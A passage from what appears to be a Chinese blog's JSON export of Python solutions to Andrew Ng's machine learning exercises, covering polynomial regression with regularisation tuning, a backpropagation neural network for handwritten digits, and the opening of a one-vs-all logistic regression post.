label='training cost')plt.plot(np.arange(1, m+1), cv_cost, label='cv cost')plt.legend(loc=1)plt.show() 这个模型拟合不太好, 欠拟合了 创建多项式特征12345678910111213141516def prepare_poly_data(*args, power): \"\"\" args: keep feeding in X, Xval, or Xtest will return in the same order \"\"\" def prepare(x): # expand feature df = poly_features(x, power=power) # normalization ndarr = normalize_feature(df).as_matrix() # add intercept term return np.insert(ndarr, 0, np.ones(ndarr.shape[0]), axis=1) return [prepare(x) for x in args] 12345def poly_features(x, power, as_ndarray=False): data = &#123;'f&#123;&#125;'.format(i): np.power(x, i) for i in range(1, power + 1)&#125; df = pd.DataFrame(data) return df.as_matrix() if as_ndarray else df 1X, y, Xval, yval, Xtest, ytest = load_data() 拆解分析 123data = &#123;'f&#123;&#125;'.format(i): np.power(X, i) for i in range(1, 3 + 1)&#125;df = pd.DataFrame(data)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } f1 f2 f3 0 -15.936758 253.980260 -4047.621971 1 -29.152979 849.896197 -24777.006175 2 36.189549 1309.683430 47396.852168 3 37.492187 1405.664111 52701.422173 4 -48.058829 2309.651088 -110999.127750 5 -8.941458 79.949670 -714.866612 6 15.307793 234.328523 3587.052500 7 -34.706266 1204.524887 -41804.560890 8 1.389154 1.929750 2.680720 9 -44.383760 1969.918139 -87432.373590 10 7.013502 49.189211 344.988637 11 22.762749 518.142738 11794.353058 12# 调用准备多项式中回归数据中的normalize_feature()函数 标准化normalize_feature(df).as_matrix() c:\\users\\fishmouse\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:1: FutureWarning: Method .as_matrix will be removed in a future version. Use .values instead. &quot;&quot;&quot;Entry point for launching an IPython kernel. array([[-3.62140776e-01, -7.55086688e-01, 1.82225876e-01], [-8.03204845e-01, 1.25825266e-03, -2.47936991e-01], [ 1.37746700e+00, 5.84826715e-01, 1.24976856e+00], [ 1.42093988e+00, 7.06646754e-01, 1.35984559e+00], [-1.43414853e+00, 1.85399982e+00, -2.03716308e+00], [-1.28687086e-01, -9.75968776e-01, 2.51385075e-01], [ 6.80581552e-01, -7.80028951e-01, 3.40655738e-01], [-9.88534310e-01, 4.51358004e-01, -6.01281871e-01], [ 2.16075753e-01, -1.07499276e+00, 2.66275156e-01], [-1.31150068e+00, 1.42280595e+00, -1.54812094e+00], [ 4.03776736e-01, -1.01501039e+00, 2.73378511e-01], [ 9.29375305e-01, -4.19807932e-01, 5.10968368e-01]])1poly_features(X, power=3) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } f1 f2 f3 0 -15.936758 253.980260 -4047.621971 1 -29.152979 849.896197 -24777.006175 2 36.189549 1309.683430 47396.852168 3 37.492187 1405.664111 52701.422173 4 -48.058829 2309.651088 -110999.127750 5 -8.941458 79.949670 -714.866612 6 15.307793 234.328523 3587.052500 7 -34.706266 1204.524887 -41804.560890 8 1.389154 1.929750 2.680720 9 -44.383760 1969.918139 -87432.373590 10 7.013502 49.189211 344.988637 11 22.762749 518.142738 11794.353058 准备多项式回归数据 扩展特征到 8阶,或者你需要的阶数 使用 归一化 来合并 $x^n$ don’t forget intercept term别忘了截距项 123def normalize_feature(df): \"\"\"Applies function along input axis(default 0) of DataFrame.\"\"\" return df.apply(lambda column: (column - column.mean()) / column.std())# mean平均值，std标准差 12X_poly, Xval_poly, Xtest_poly= prepare_poly_data(X, Xval, Xtest, power=8)X_poly[:3, :] array([[ 1.00000000e+00, -3.62140776e-01, -7.55086688e-01, 1.82225876e-01, -7.06189908e-01, 3.06617917e-01, -5.90877673e-01, 3.44515797e-01, -5.08481165e-01], [ 1.00000000e+00, -8.03204845e-01, 1.25825266e-03, -2.47936991e-01, -3.27023420e-01, 9.33963187e-02, -4.35817606e-01, 2.55416116e-01, -4.48912493e-01], [ 1.00000000e+00, 1.37746700e+00, 5.84826715e-01, 1.24976856e+00, 2.45311974e-01, 9.78359696e-01, -1.21556976e-02, 7.56568484e-01, -1.70352114e-01]])画出学习曲线 首先，我们没有使用正则化，所以 $\\lambda=0$ 12345678910111213141516171819def plot_learning_curve(X, y, Xval, yval, l=0): training_cost, cv_cost = [], [] m = X.shape[0] for i in range(1, m + 1): # regularization applies here for fitting parameters res = linear_regression_np(X[:i, :], y[:i], l=l) # remember, when you compute the cost here, you are computing # non-regularized cost. Regularization is used to fit parameters only tc = cost(res.x, X[:i, :], y[:i]) cv = cost(res.x, Xval, yval) training_cost.append(tc) cv_cost.append(cv) plt.plot(np.arange(1, m + 1), training_cost, label='training cost') plt.plot(np.arange(1, m + 1), cv_cost, label='cv cost') plt.legend(loc=1) 12plot_learning_curve(X_poly, y, Xval_poly, yval, l=0)plt.show() 你可以看到训练的代价太低了，不真实. 这是 过拟合了 try $\\lambda=1$12plot_learning_curve(X_poly, y, Xval_poly, yval, l=1)plt.show() 训练代价增加了些，不再是0了。也就是说我们减轻过拟合 try $\\lambda=100$12plot_learning_curve(X_poly, y, Xval_poly, yval, l=100)plt.show() 太多正则化了.变成 欠拟合状态 找到最佳的 $\\lambda$12l_candidate = [0, 0.001, 0.003, 0.01, 0.03, 0.1, 0.3, 1, 3, 10]training_cost, cv_cost = [], [] 12345678for l in l_candidate: res = linear_regression_np(X_poly, y, l) tc = cost(res.x, X_poly, y) cv = cost(res.x, Xval_poly, yval) training_cost.append(tc) cv_cost.append(cv) 12345678plt.plot(l_candidate, training_cost, label='training')plt.plot(l_candidate, cv_cost, label='cross validation')plt.legend(loc=2)plt.xlabel('lambda')plt.ylabel('cost')plt.show() 12# best cv I got from all those candidatesl_candidate[np.argmin(cv_cost)] 11234# use test data to compute the costfor l in l_candidate: theta = linear_regression_np(X_poly, y, l).x print('test cost(l=&#123;&#125;) = &#123;&#125;'.format(l, cost(theta, Xtest_poly, ytest))) test cost(l=0) = 10.055426362410126 test cost(l=0.001) = 11.001927632262907 test cost(l=0.003) = 11.26474655167747 test cost(l=0.01) = 10.880780731411715 test cost(l=0.03) = 10.022100517865269 test cost(l=0.1) = 8.63190793331871 test cost(l=0.3) = 7.3366077892272585 test cost(l=1) = 7.466283751156784 test cost(l=3) = 11.643941860536106 test cost(l=10) = 27.715080254176254调参后， $\\lambda = 0.3$ 是最优选择，这个时候测试代价最小 参考链接 如何系统地学习Python 中 matplotlib, numpy, scipy, pandas？ - 景略集智的回答 - 知乎 如何系统地学习Python 中 matplotlib, numpy, scipy, pandas？ - 刘志军的回答 - 知乎 pandas中DataFrame 偏差与误差1 偏差与误差2","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"泛化能力","slug":"泛化能力","permalink":"https://fishni.github.io/tags/%E6%B3%9B%E5%8C%96%E8%83%BD%E5%8A%9B/"}]},{"title":"【吴恩达机器学习】练习4-神经网络","slug":"ML-004神经网络-Exercise4","date":"2020-06-30T16:00:00.000Z","updated":"2020-07-06T15:29:42.288Z","comments":true,"path":"2020/07/01/ML-004神经网络-Exercise4/","link":"","permalink":"https://fishni.github.io/2020/07/01/ML-004%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-Exercise4/","excerpt":"对于这个练习，我们将再次处理手写数字数据集，这次使用反向传播的前馈神经网络。 我们将通过反向传播算法实现神经网络代价函数和梯度计算的非正则化和正则化版本。 我们还将实现随机权重初始化和使用网络进行预测的方法。","text":"对于这个练习，我们将再次处理手写数字数据集，这次使用反向传播的前馈神经网络。 我们将通过反向传播算法实现神经网络代价函数和梯度计算的非正则化和正则化版本。 我们还将实现随机权重初始化和使用网络进行预测的方法。 数据集加载由于我们在练习3中使用的数据集是相同的，所以我们将重新使用代码来加载数据。 1234import numpy as npimport pandas as pdimport matplotlib.pyplot as pltfrom scipy.io import loadmat 12data = loadmat('ex4data1.mat')data {&apos;__header__&apos;: b&apos;MATLAB 5.0 MAT-file, Platform: GLNXA64, Created on: Sun Oct 16 13:09:09 2011&apos;, &apos;__version__&apos;: &apos;1.0&apos;, &apos;__globals__&apos;: [], &apos;X&apos;: array([[0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], ..., [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.]]), &apos;y&apos;: array([[10], [10], [10], ..., [ 9], [ 9], [ 9]], dtype=uint8)}由于我们以后需要这些（并将经常使用它们），我们先来创建一些有用的变量。 1234X = data['X']y = data['y']X.shape, y.shape#看下维度 ((5000, 400), (5000, 1))one-hot编码 one hot编 是将类别变量转换为机器学习算法易于利用的一种形式的过程。One-Hot编码是分类变量作为二进制向量的表示。这首先要求将分类值映射到整数值。然后，每个整数值被表示为二进制向量，除了整数的索引之外，它都是零值，它被标记为1。 示例： 我们也需要对我们的y标签进行一次one-hot 编码。 one-hot 编码将类标签n（k类）转换为长度为k的向量，其中索引n为“hot”（1），而其余为0。 Scikitlearn有一个内置的实用程序，我们可以使用这个。 1234567from sklearn.preprocessing import OneHotEncoder# 初始化OneHotEncoder实例时，默认sparse参数为True，编码后返回的是一个稀疏矩阵的对象，#如果要使用一般要调用toarray()方法转化成array对象。# 若将sparse参数设置为False，则直接生成array对象，可直接使用。encoder = OneHotEncoder(sparse=False,categories='auto')y_onehot = encoder.fit_transform(y)y_onehot.shape (5000, 10)1y[0], y_onehot[0,:] (array([10], dtype=uint8), array([0., 0., 0., 0., 0., 0., 0., 0., 0., 1.]))我们要为此练习构建的神经网络具有与我们的实例数据（400 +偏置单元）大小匹配的输入层，25个单位的隐藏层（带有偏置单元的26个），以及一个输出层， 10个单位对应我们的一个one-hot编码类标签。 有关网络架构的更多详细信息和图像，请参阅“练习”文件夹中的PDF。 我们需要实现的第一件是评估一组给定的网络参数的损失的代价函数。 源函数在练习文本中（看起来很吓人）。 以下是代价函数的代码。 sigmoid 函数g 代表一个常用的逻辑函数（logistic function）为S形函数（Sigmoid function），公式为： $g\\left( z \\right)=\\frac{1}{1+{{e}^{-z}}}$合起来，我们得到逻辑回归模型的假设函数： ${{h}_{\\theta }}\\left( x \\right)=\\frac{1}{1+{{e}^{-{{\\theta }^{T}}X}}}$ 12def sigmoid(z): return 1 / (1 + np.exp(-z)) 前向传播函数 (400 + 1) -&gt; (25 + 1) -&gt; (10) 12m = X.shape[0]np.insert(X,0,values=np.ones(m),axis=1) array([[1., 0., 0., ..., 0., 0., 0.], [1., 0., 0., ..., 0., 0., 0.], [1., 0., 0., ..., 0., 0., 0.], ..., [1., 0., 0., ..., 0., 0., 0.], [1., 0., 0., ..., 0., 0., 0.], [1., 0., 0., ..., 0., 0., 0.]])12345678910def forward_propagate(X, theta1, theta2): m = X.shape[0] # 行数 a1 = np.insert(X, 0, values=np.ones(m), axis=1) # 0插入位置，np.ones(m) m维度，axis=1列的方向插入 z2 = a1 * theta1.T a2 = np.insert(sigmoid(z2), 0, values=np.ones(m), axis=1) z3 = a2 * theta2.T h = sigmoid(z3) return a1, z2, a2, z3, h 代价函数 1234567891011121314151617181920212223242526def cost(params, input_size, hidden_size, num_labels, X, y, learning_rate): # 传入：神经网络参数，输入层维度，隐含层维度，标签数，训练数据，学习率 m = X.shape[0] # 样本个数 X = np.matrix(X) # 转换为numpy型矩阵 y = np.matrix(y) # reshape the parameter array into parameter matrices for each layer # 为每一层重塑参数数组为参数矩阵 #从params中获取神经网络参数，并按照输入层维度和隐藏层维度重新定义参数的维度 theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + 1)], (hidden_size, (input_size + 1)))) theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + 1):], (num_labels, (hidden_size + 1)))) # run the feed-forward pass运行前向传播函数 # 调用前面写好的前项传播函数 a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2) # compute the cost计算代价 J = 0 for i in range(m): #遍历每个样本 first_term = np.multiply(-y[i,:], np.log(h[i,:])) second_term = np.multiply((1 - y[i,:]), np.log(1 - h[i,:])) J += np.sum(first_term - second_term) J = J / m return J 这个Sigmoid函数我们以前使用过。 前向传播函数计算给定当前参数的每个训练实例的假设。 它的输出形状应该与y的一个one-hot编码相同。 123456789101112131415161718# 初始化设置input_size = 400hidden_size = 25num_labels = 10learning_rate = 1# 随机初始化完整网络参数大小的参数数组params = (np.random.random(size=hidden_size * (input_size + 1) + num_labels * (hidden_size + 1)) - 0.5) * 0.25m = X.shape[0]X = np.matrix(X)y = np.matrix(y)# 将参数数组解开为每个层的参数矩阵（在不更改数组数据的情况下为数组提供新形状）theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + 1)], (hidden_size, (input_size + 1))))theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + 1):], (num_labels, (hidden_size + 1))))theta1.shape, theta2.shape ((25, 401), (10, 26))12a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)a1.shape, z2.shape, a2.shape, z3.shape, h.shape ((5000, 401), (5000, 25), (5000, 26), (5000, 10), (5000, 10))代价函数在计算假设矩阵h之后，应用代价函数来计算y和h之间的总误差。 1cost(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate) 7.182002885834476 整合上述代码 12345678910111213141516171819202122232425262728293031323334353637383940def sigmoid(z): return 1/(1+np.exp(-z))def forward_propagate(X,theta1,theta2): # a1 5000*401 theta1.T(25*401).T = z1 5000*25 # a2 5000*26 theta2.T(10*26).T =5000*10 m = X.shape[0] a1 = np.insert(X, 0, values=np.ones(m), axis=1) z2 = a1* theta1.T a2 = np.insert(sigmoid(z2),0,values=np.ones(m),axis=1) z3 = a2 * theta2.T h = sigmoid(z3) return a1,z2,a2,z3,hdef cost(params, input_size,hidden_size,num_lables,X,y,learning_rate): m = X.shape[0] X = np.matrix(X) y = np.matrix(y) theta1 = np.matrix(np.reshape(params[:hidden_size*(input_size+1)],(hidden_size,input_size+1))) theta2 = np.matrix(np.reshape(params[hidden_size*(input_size+1):],(num_lables,hidden_size+1))) a1,z2,a2,z3,h = forward_propagate(X,theta1,theta2) J=0 for i in range(m): first_term = np.multiply(-y[i,:], np.log(h[i,:])) second_term = np.multiply((1 - y[i,:]), np.log(1 - h[i,:])) J += np.sum(first_term - second_term) J = J / m return Jinput_size= 400hidden_size= 25num_labels= 10learning_rate =1params = (np.random.random(size=hidden_size * (input_size + 1) + num_labels * (hidden_size + 1)) - 0.5) * 0.25cost(params,input_size,hidden_size,num_labels,X,y_onehot,learning_rate) 7.132323728323127正则化代价函数我们的下一步是增加代价函数的正则化。 它实际上并不像看起来那么复杂 - 事实上，正则化术语只是我们已经计算出的代价的一个补充。 下面是修改后的代价函数。 12345678910111213141516171819202122232425def cost(params, input_size, hidden_size, num_labels, X, y, learning_rate): m = X.shape[0] X = np.matrix(X) y = np.matrix(y) # reshape the parameter array into parameter matrices for each layer theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + 1)], (hidden_size, (input_size + 1)))) theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + 1):], (num_labels, (hidden_size + 1)))) # run the feed-forward pass a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2) # compute the cost J = 0 for i in range(m): first_term = np.multiply(-y[i,:], np.log(h[i,:])) second_term = np.multiply((1 - y[i,:]), np.log(1 - h[i,:])) J += np.sum(first_term - second_term) J = J/m # add the cost regularization term J += (float(learning_rate) / (2 * m)) * (np.sum(np.power(theta1[:,1:], 2)) + np.sum(np.power(theta2[:,1:], 2))) return J 1cost(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate) 7.137673923569304反向传播接下来是反向传播算法。 反向传播参数更新计算将减少训练数据上的神经网络误差。 我们需要的第一件事是计算我们之前创建的Sigmoid函数的梯度的函数。 12def sigmoid_gradient(z): return np.multiply(sigmoid(z), (1 - sigmoid(z))) 现在我们准备好实施反向传播来计算梯度。 由于反向传播所需的计算是代价函数中所需的计算过程，我们实际上将扩展代价函数以执行反向传播并返回代价和梯度。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869def backprop(params, input_size, hidden_size, num_labels, X, y, learning_rate): # 步骤一：获取样本个数 m = X.shape[0] # 步骤二：将矩阵X,y转换为numpy型矩阵 X = np.matrix(X) y = np.matrix(y) # 步骤三：从params中获取神经网络参数，并按照输入层维度和隐含层维度重新定义参数的维度 # reshape the parameter array into parameter matrices for each layer theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + 1)], (hidden_size, (input_size + 1)))) theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + 1):], (num_labels, (hidden_size + 1)))) # 步骤四：调用前面写好的前向传播函数 # run the feed-forward pass a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2) # 步骤五：初始化 # initializations J = 0 delta1 = np.zeros(theta1.shape) # (25, 401) delta2 = np.zeros(theta2.shape) # (10, 26) # 步骤六：计算代价函数 # compute the cost for i in range(m): first_term = np.multiply(-y[i,:], np.log(h[i,:])) second_term = np.multiply((1 - y[i,:]), np.log(1 - h[i,:])) J += np.sum(first_term - second_term) J = J / m # 步骤七：正则化 # add the cost regularization term J += (float(learning_rate) / (2 * m)) * (np.sum(np.power(theta1[:,1:], 2)) + np.sum(np.power(theta2[:,1:], 2))) # 步骤八：实现反向传播 # perform backpropagation执行反向传播 # a1 （5000,401），theta1 （25,401）,theta2 (10,26) # z2= （5000,401）*（25，401）.T=(5000,25) , a2 = (5000,26) # z3 =(5000,26)*(10,26).T= (5000,10) a3 = h = (5000,10) for t in range(m): a1t = a1[t,:] # (1, 401) z2t = z2[t,:] # (1, 25) a2t = a2[t,:] # (1, 26) ht = h[t,:] # (1, 10) yt = y[t,:] # (1, 10) d3t = ht - yt # (1, 10) # theta2 （10,26） z2t = np.insert(z2t, 0, values=np.ones(1)) # (1, 26) # sigmoid_gradient(z2t) （1,26） # (theta2.T (26,10) d3t（1,10）.T ).T= (26,1).T = (1,26) d2t = np.multiply((theta2.T * d3t.T).T, sigmoid_gradient(z2t)) # (1, 26) delta1 = delta1 + (d2t[:,1:]).T * a1t # 输入层到隐含层的误差 delta2 = delta2 + d3t.T * a2t # 隐含层到输出层的误差 delta1 = delta1 / m delta2 = delta2 / m # 步骤九：将梯度矩阵转换为单个数组 # unravel the gradient matrices into a single array grad = np.concatenate((np.ravel(delta1), np.ravel(delta2))) return J, grad 梯度矩阵转换为单个数组 1234567a = np.array([[1, 2], [3, 4]])b = np.array([[5, 6]])print(\"111:\",np.ravel(a))print(\"222:\",np.concatenate((a,b))) # 默认axis=0print(\"ddd:\",np.concatenate((a, b.T), axis=1))print(\"--------\")np.concatenate((np.ravel(a),np.ravel(b))) 111: [1 2 3 4] 222: [[1 2] [3 4] [5 6]] ddd: [[1 2 5] [3 4 6]] -------- array([1, 2, 3, 4, 5, 6])反向传播计算的最难的部分（除了理解为什么我们正在做所有这些计算）是获得正确矩阵维度。 顺便说一下，你容易混淆了A * B与np.multiply（A，B）使用。 基本上前者是矩阵乘法，后者是元素乘法（除非A或B是标量值，在这种情况下没关系）。无论如何，让我们测试一下，以确保函数返回我们期望的。 12J, grad = backprop(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate)J, grad.shape (7.137673923569304, (10285,))矩阵乘法和元素乘法 矩阵乘法 123456a = np.matrix(np.array([[1,2,3,3]])) # numpy型矩阵b = np.matrix(np.array([[2],[3],[4],[5]]))print(a.shape,b.shape)print(a*b)print(np.dot(a,b)) (1, 4) (4, 1) [[35]] [[35]] 元素乘法示例 1234a = np.matrix(np.array([[1,2,3,3]]))b = np.matrix(np.array([[2,4,6,8]]))np.multiply(b,a) matrix([[ 2, 8, 18, 24]])反向传播正则化 我们还需要对反向传播函数进行一个修改，即将梯度计算加正则化。 最后的正式版本如下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455def backprop(params, input_size, hidden_size, num_labels, X, y, learning_rate): m = X.shape[0] X = np.matrix(X) y = np.matrix(y) # reshape the parameter array into parameter matrices for each layer theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + 1)], (hidden_size, (input_size + 1)))) theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + 1):], (num_labels, (hidden_size + 1)))) # run the feed-forward pass a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2) # initializations J = 0 delta1 = np.zeros(theta1.shape) # (25, 401) delta2 = np.zeros(theta2.shape) # (10, 26) # compute the cost for i in range(m): first_term = np.multiply(-y[i,:], np.log(h[i,:])) second_term = np.multiply((1 - y[i,:]), np.log(1 - h[i,:])) J += np.sum(first_term - second_term) J = J / m # add the cost regularization term J += (float(learning_rate) / (2 * m)) * (np.sum(np.power(theta1[:,1:], 2)) + np.sum(np.power(theta2[:,1:], 2))) # perform backpropagation for t in range(m): a1t = a1[t,:] # (1, 401) z2t = z2[t,:] # (1, 25) a2t = a2[t,:] # (1, 26) ht = h[t,:] # (1, 10) yt = y[t,:] # (1, 10) d3t = ht - yt # (1, 10) z2t = np.insert(z2t, 0, values=np.ones(1)) # (1, 26) d2t = np.multiply((theta2.T * d3t.T).T, sigmoid_gradient(z2t)) # (1, 26) delta1 = delta1 + (d2t[:,1:]).T * a1t delta2 = delta2 + d3t.T * a2t delta1 = delta1 / m delta2 = delta2 / m # add the gradient regularization term delta1[:,1:] = delta1[:,1:] + (theta1[:,1:] * learning_rate) / m delta2[:,1:] = delta2[:,1:] + (theta2[:,1:] * learning_rate) / m # unravel the gradient matrices into a single array grad = np.concatenate((np.ravel(delta1), np.ravel(delta2))) return J, grad 12J, grad = backprop(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate)J, grad.shape (7.137673923569304, (10285,))我们终于准备好训练我们的网络，并用它进行预测。 这与以往的具有多类逻辑回归的练习大致相似。 123456from scipy.optimize import minimize# minimize the objective functionfmin = minimize(fun=backprop, x0=params, args=(input_size, hidden_size, num_labels, X, y_onehot, learning_rate), method='TNC', jac=True, options=&#123;'maxiter': 250&#125;)fmin fun: 0.36936848574990994 jac: array([-1.94682911e-04, 2.79038111e-06, -8.05264111e-06, ..., -7.06122696e-04, -9.89911805e-04, -9.76751347e-04]) message: &apos;Max. number of function evaluations reached&apos; nfev: 250 nit: 16 status: 3 success: False x: array([-0.13037322, 0.01395191, -0.04026321, ..., -1.50678966, -0.13882294, -0.24985413])由于目标函数不太可能完全收敛，我们对迭代次数进行了限制。 我们的总代价已经下降到0.5以下，这是算法正常工作的一个很好的指标。 让我们使用它发现的参数，并通过网络转发，以获得一些预测。 让我们使用它找到的参数，并通过网络前向传播以获得预测。 1234567X = np.matrix(X)theta1 = np.matrix(np.reshape(fmin.x[:hidden_size * (input_size + 1)], (hidden_size, (input_size + 1))))theta2 = np.matrix(np.reshape(fmin.x[hidden_size * (input_size + 1):], (num_labels, (hidden_size + 1))))a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)y_pred = np.array(np.argmax(h, axis=1) + 1)y_pred array([[10], [10], [10], ..., [ 9], [ 9], [ 9]], dtype=int64) np.argmax测试 123a=np.array([[10, 11, 12], [13, 14, 15]])np.argmax(a, axis=1) array([2, 2], dtype=int64)最后，我们可以计算准确度，看看我们训练完毕的神经网络效果怎么样。 123correct = [1 if a == b else 0 for (a, b) in zip(y_pred, y)]accuracy = (sum(map(int, correct)) / float(len(correct)))print ('accuracy = &#123;0&#125;%'.format(accuracy * 100)) accuracy = 98.34%我们已经成功地实施了一个基本的反向传播神经网络，并用它来分类手写数字图像。 在下一个练习中，我们将介绍另一个强大的监督学习算法，支持向量机。 参考资料 one-hot编码 反向传播算法","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"神经网络","slug":"神经网络","permalink":"https://fishni.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"}]},{"title":"【吴恩达机器学习】练习3-多分类","slug":"ML-003多分类-Exercise3","date":"2020-06-22T16:00:00.000Z","updated":"2020-07-06T15:30:39.811Z","comments":true,"path":"2020/06/23/ML-003多分类-Exercise3/","link":"","permalink":"https://fishni.github.io/2020/06/23/ML-003%E5%A4%9A%E5%88%86%E7%B1%BB-Exercise3/","excerpt":"本文运用逻辑回归对手写数字进行分类预测。。。。","text":"本文运用逻辑回归对手写数字进行分类预测。。。。 该代码涵盖了基于Python的解决方案，用于Coursera机器学习课程的第三个编程练习。 有关详细说明和方程式，请参阅exercise text。 加载数据集对于此练习，我们将使用逻辑回归来识别手写数字（1到10）。 我们将扩展我们在练习2中写的逻辑回归的实现，并将其应用于一对一的分类。 让我们开始加载数据集。 .mat文件是在MATLAB的数据存储的标准格式(标准的二进制文件)，要在Python中加载，我们需要使用一个SciPy工具。 导入相关模块 1234import numpy as npimport pandas as pdimport matplotlib.pyplot as pltfrom scipy.io import loadmat 加载.mat形式数据集 12data = loadmat('ex3data1.mat')data {&apos;__header__&apos;: b&apos;MATLAB 5.0 MAT-file, Platform: GLNXA64, Created on: Sun Oct 16 13:09:09 2011&apos;, &apos;__version__&apos;: &apos;1.0&apos;, &apos;__globals__&apos;: [], &apos;X&apos;: array([[0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], ..., [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.]]), &apos;y&apos;: array([[10], [10], [10], ..., [ 9], [ 9], [ 9]], dtype=uint8)} 查看数据集的维度及分析 1data['X'].shape, data['y'].shape ((5000, 400), (5000, 1))好的，我们已经加载了我们的数据。图像在martix X中表示为400维向量（其中有5,000个）。 400维“特征”是原始20 x 20图像中每个像素的灰度强度。类标签在向量y中作为表示图像中数字的数字类。 第一个任务是将我们的逻辑回归实现修改为完全向量化（即没有“for”循环）。这是因为向量化代码除了简洁外，还能够利用线性代数优化，并且通常比迭代代码快得多。但是，如果从练习2中看到我们的代价函数已经完全向量化实现了，所以我们可以在这里重复使用相同的实现。 sigmoid 函数g 代表一个常用的逻辑函数（logistic function）为S形函数（Sigmoid function），公式为： $g\\left( z \\right)=\\frac{1}{1+{{e}^{-z}}}$合起来，我们得到逻辑回归模型的假设函数： ${{h}_{\\theta }}\\left( x \\right)=\\frac{1}{1+{{e}^{-{{\\theta }^{T}}X}}}$ 123# 定义sigmoid函数def sigmoid(z): return 1 / (1 + np.exp(-z)) 交叉熵损失函数代价函数：$J\\left( \\theta \\right)=\\frac{1}{m}\\sum\\limits_{i=1}^{m}{[-{{y}^{(i)}}\\log \\left( {{h}_{\\theta }}\\left( {{x}^{(i)}} \\right) \\right)-\\left( 1-{{y}^{(i)}} \\right)\\log \\left( 1-{{h}_{\\theta }}\\left( {{x}^{(i)}} \\right) \\right)]}$ 123456789101112def cost(theta, X, y, learningRate): # 相关数组转换为矩阵 theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) first = np.multiply(-y, np.log(sigmoid(X * theta.T))) second = np.multiply((1 - y), np.log(1 - sigmoid(X * theta.T))) # 正则化；[:]切片，前者控制行，后这控制列theta.shape[1]为列数 reg = (learningRate / (2 * len(X))) * np.sum(np.power(theta[:,1:theta.shape[1]], 2)) return np.sum(first - second) / len(X) + reg 梯度下降如果我们要使用梯度下降法令这个代价函数最小化，因为我们未对${{\\theta }_{0}}$ 进行正则化，所以梯度下降算法将分两种情形： $Repeat$ $until$ $convergence${ ​ ${\\theta_0}:={\\theta_0}-a\\frac{1}{m}\\sum\\limits_{i=1}^{m}{(({h_\\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{0}^{(i)}})$ ​ ${\\theta_j}:={\\theta_j}-a[\\frac{1}{m}\\sum\\limits_{i=1}^{m}{({h_\\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{j}^{\\left( i \\right)}}+\\frac{\\lambda }{m}{\\theta_j}]$ ​ $for$ $j=1,2,…n$ ​ } 以下是原始代码是使用for循环的梯度函数： 12345678910111213141516171819def gradient_with_loop(theta, X, y, learningRate): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) parameters = int(theta.ravel().shape[1]) # ravel矩阵向量化 grad = np.zeros(parameters) #返回来一个给定形状和类型的用0填充的数组 error = sigmoid(X * theta.T) - y for i in range(parameters): term = np.multiply(error, X[:,i]) if (i == 0): grad[i] = np.sum(term) / len(X) else: grad[i] = (np.sum(term) / len(X)) + ((learningRate / len(X)) * theta[:,i]) return grad 向量化的梯度函数 1234567891011121314def gradient(theta, X, y, learningRate): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) parameters = int(theta.ravel().shape[1]) error = sigmoid(X * theta.T) - y grad = ((X.T * error) / len(X)).T + ((learningRate / len(X)) * theta) # intercept gradient is not regularized grad[0, 0] = np.sum(np.multiply(error, X[:,0])) / len(X) return np.array(grad).ravel() 分类器构造现在我们已经定义了代价函数和梯度函数，现在是构建分类器的时候了。 对于这个任务，我们有10个可能的类，并且由于逻辑回归只能一次在2个类之间进行分类，我们需要多类分类的策略。 在本练习中，我们的任务是实现一对一全分类方法，其中具有k个不同类的标签就有k个分类器，每个分类器在“类别 i”和“不是 i”之间决定。 我们将把分类器训练包含在一个函数中，该函数计算10个分类器中的每个分类器的最终权重，并将权重返回为$k *X（n + 1）$数组，其中n(特征数量）是参数数量，k是k个分类器。 向量化标签 12345678910111213141516171819202122232425262728from scipy.optimize import minimizedef one_vs_all(X, y, num_labels, learning_rate): rows = 